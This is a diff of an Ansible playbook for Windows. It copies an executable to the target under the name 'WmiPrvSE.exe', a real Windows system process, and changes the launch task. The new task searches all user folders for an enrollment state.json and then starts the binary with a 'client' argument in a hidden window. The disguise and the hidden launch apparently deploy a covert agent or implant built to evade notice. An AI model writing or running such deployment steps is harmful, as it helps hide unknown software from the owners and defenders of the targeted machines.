@@ -20,14 +20,11 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    # --- DYNAMIC CHECK & LAUNCH ---
     - name: Check for enrollment and launch if found
-      ansible.windows.win_shell: |
-        # $env:APPDATA automatically resolves to the current user's Roaming folder
-        $stateFile = "$env:APPDATA\gundo\state.json"
-        
-        if (Test-Path $stateFile) {
-            Write-Host "[+] Agent is enrolled. Launching in background..."
+      ansible.windows.win_shell: >
+        $stateFile = Get-ChildItem -Path "C:\Users" -Filter "state.json" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName -First 1;
+        if ($stateFile) {
+            Write-Host "[+] Agent is enrolled at $stateFile. Launching in background...";
             Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
         } else {
             Write-Host "[-] Agent is not enrolled yet. Skipping background launch."
